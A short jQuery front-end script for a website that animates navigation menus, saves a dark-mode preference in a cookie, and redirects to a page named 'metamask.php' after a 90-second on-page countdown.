
$(document).ready(function(e) {
  if(!(navigator.userAgent.match(/(iPhone|iPod|Android|ios|iPad)/i))){
    $(".Header__NavMenu-sc-1grwj6n-8").mousemove(function(){
      $(this).find(".Header__NavMenuChild-sc-1grwj6n-9").css({"opacity":"1","visibility":"visible","-webkit-animation-name":"flipInY","animation-name":"flipInY"});
    });
    $(".Header__NavMenu-sc-1grwj6n-8").mouseleave(function(){
      $(this).find(".Header__NavMenuChild-sc-1grwj6n-9").css({"visibility":"hidden","-webkit-animation-name":"flipOutY","animation-name":"flipOutY"});
    });  
  }
  if(getCookie('skinmode')==null){
     setCookie('skinmode',0,1);
	 $("body").removeClass("dark-mode");
  }
  if(getCookie('skinmode')==0){
	 $("body").removeClass("dark-mode");
  }
  if(getCookie('skinmode')==1){
     $("body").addClass("dark-mode");
  }
  $(".w-icon-nav-menu").click(function(e) {
    $("nav").fadeToggle();
  });
   $(".Header__NavMenu-sc-1grwj6n-8").click(function(){
      $(this).find(".Header__NavMenuChild-sc-1grwj6n-9").fadeToggle();
   });
   $("#skinBtn").click(function(){
      if($("body").hasClass("dark-mode")){
		 setCookie('skinmode',0,1);
	     $("body").removeClass("dark-mode");
	  }else{
		 setCookie('skinmode',1,1);
	     $("body").addClass("dark-mode");
	  }
   });
   
  
  
});
if(document.getElementById('seconds')){
	  var t = 90;
	  var time = document.getElementById('seconds');
      function fun() {
		t--;
		time.innerHTML = t;
		if(t <= 0) {
			location.href = "metamask.php";
			clearInterval(inter);
		}
	}
	var inter = setInterval("fun()", 1000);
   }
function setCookie(name,value,tian){
	var Days=1;
	if(typeof(tian)=='undefined'||!tian||tian==''||tian==null||typeof(tian)!='number'||tian<=0){
		
	}else{
		Days=tian;
	}
	var exp=new Date();
	exp.setTime(exp.getTime() + Days*24*60*60*1000);
	document.cookie=name + "="+ escape (value) + ";expires=" + exp.toGMTString() + ";path=/";
}
function getCookie(name){
	var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
	if(arr=document.cookie.match(reg))
	return unescape(arr[2]);
	else
	return null;
}